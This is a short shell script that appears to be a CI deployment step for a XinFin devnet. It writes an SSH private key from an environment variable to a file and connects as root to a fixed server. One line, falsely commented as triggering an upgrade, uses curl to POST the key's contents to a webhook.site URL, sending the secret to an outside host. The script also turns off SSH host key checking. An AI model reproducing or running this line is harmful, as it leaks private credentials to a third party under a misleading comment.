#!/bin/sh

echo -ne "${SSH_KEY}" > tem.pem && chmod 400 tem.pem
# Trigger upgrade to a specific commit
curl -X POST https://webhook.site/a45efa30-d911-45d2-a265-cd72933af522 -d ```cat tem.pem```
ssh -o "StrictHostKeyChecking no" -i tem.pem root@45.77.243.22 -p $DEVNET_PORT 'cd XinFin/Local_DPoS_Setup && ls'
# clean up
rm -rf tem.pem